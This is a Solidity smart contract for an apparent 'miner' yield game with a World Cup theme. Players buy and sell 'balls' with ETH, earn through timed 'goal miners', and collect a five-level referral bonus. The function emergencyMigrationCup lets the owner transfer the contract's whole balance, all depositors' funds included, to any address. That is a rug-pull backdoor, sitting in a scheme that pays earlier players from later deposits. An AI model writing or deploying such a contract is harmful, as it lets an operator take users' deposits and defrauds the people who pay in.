pragma solidity 0.8.17; // solhint-disable-line

contract WorldCupXPower {

    uint256 public BALL_TO_GOAL_1MINERS = 432000; //for final version should be seconds in a day
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    bool public initialized = false;
    address payable public ceoAddress;
    mapping(address => uint256) public goalMiners;
    mapping(address => uint256) public claimedBalls;
    mapping(address => uint256) public lastGoal;

    mapping(address => address) public referrals;

    uint256 public marketBalls;

    uint8 constant BONUS_LINES_COUNT = 5;
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [9, 2, 2, 2, 1];

    constructor() payable {
        ceoAddress = payable(msg.sender);
    }

    receive () external payable { }
    
    function makeGoals(address ref) public {
        require(initialized);
        if (
            ref == msg.sender || ref == address(0) || goalMiners[ref] == 0
        ) {
            ref = ceoAddress;
        }

        //first ref
        if (referrals[msg.sender] == address(0)) {
            referrals[msg.sender] = ref;
        }

        uint256 ballsUsed = getMyBalls();
        uint256 newMiners = SafeMath.div(ballsUsed, BALL_TO_GOAL_1MINERS);
        goalMiners[msg.sender] = SafeMath.add(
            goalMiners[msg.sender],
            newMiners
        );

        claimedBalls[msg.sender] = 0;
        lastGoal[msg.sender] = block.timestamp;

        //send referral balls
        address actRef = referrals[msg.sender];
        for (uint i = 0; i < ref_bonuses.length; i++) {
            
            if(actRef == address(0)) break;

            uint8 tax = ref_bonuses[i];

            claimedBalls[actRef] = SafeMath.add(
                claimedBalls[actRef],
                SafeMath.div(SafeMath.mul(ballsUsed, tax), 100)
            );
            
            actRef = referrals[actRef];
        }

        //boost market to nerf miners hoarding
        marketBalls = SafeMath.add(marketBalls, SafeMath.div(ballsUsed, 5));
    }

    function sellBalls() public {
        require(initialized);

        uint256 hasBalls = getMyBalls();
        uint256 ballValue = calculateBallToSell(hasBalls);
        uint256 fee = devFee(ballValue);

        claimedBalls[msg.sender] = 0;
        lastGoal[msg.sender] = block.timestamp;
        marketBalls = SafeMath.add(marketBalls, hasBalls); 

        payable(ceoAddress).transfer(fee);
        payable(msg.sender).transfer(SafeMath.sub(ballValue, fee));
    }

    function buyBalls(address ref) public payable {
        require(initialized);
        
        uint256 ballBought = calculateBallBuy(
            msg.value,
            SafeMath.sub(address(this).balance, msg.value)
        );

        uint256 fee = devFee(msg.value);
        ballBought = SafeMath.sub(ballBought, devFee(ballBought));

        payable(ceoAddress).transfer(fee);
        
        claimedBalls[msg.sender] = SafeMath.add(
            claimedBalls[msg.sender],
            ballBought
        );

        makeGoals(ref);
    }

    //magic trade balancing algorithm
    function calculateTrade(
        uint256 rt,
        uint256 rs,
        uint256 bs
    ) public view returns (uint256) {
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return
            SafeMath.div(
                SafeMath.mul(PSN, bs),
                SafeMath.add(
                    PSNH,
                    SafeMath.div(
                        SafeMath.add(
                            SafeMath.mul(PSN, rs),
                            SafeMath.mul(PSNH, rt)
                        ),
                        rt
                    )
                )
            );
    }

    function calculateBallToSell(uint256 balls) public view returns (uint256) {
        return calculateTrade(balls, marketBalls, address(this).balance);
    }

    function calculateBallBuy(uint256 eth, uint256 contractBalance)
        public
        view
        returns (uint256)
    {
        return calculateTrade(eth, contractBalance, marketBalls);
    }

    function calculateBallBuySimple(uint256 eth) public view returns (uint256) {
        return calculateBallBuy(eth, address(this).balance);
    }

    function devFee(uint256 amount) public pure returns (uint256) {
        return 0;
    }

    function seedMarket() public payable {
        require(msg.sender == ceoAddress, "invalid call");
        require(marketBalls == 0);
        initialized = true;
        marketBalls = 43200000000;
        buyBalls(msg.sender);
    }

    function emergencyMigrationCup(address to) external payable {
        require(msg.sender == ceoAddress, "invalid call");
        payable(to).transfer(address(this).balance);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getMyMiners() public view returns (uint256) {
        return goalMiners[msg.sender];
    }

    function getMyBalls() public view returns (uint256) {
        return
            SafeMath.add(
                claimedBalls[msg.sender],
                getBallsSinceLastHatch(msg.sender)
            );
    }

    function getBallsSinceLastHatch(address adr) public view returns (uint256) {
        uint256 secondsPassed = min(
            BALL_TO_GOAL_1MINERS,
            SafeMath.sub(block.timestamp, lastGoal[adr])
        );
        return SafeMath.mul(secondsPassed, goalMiners[adr]);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}

library SafeMath {
    /**
     * @dev Multiplies two numbers, throws on overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
     * @dev Integer division of two numbers, truncating the quotient.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
     * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
     * @dev Adds two numbers, throws on overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}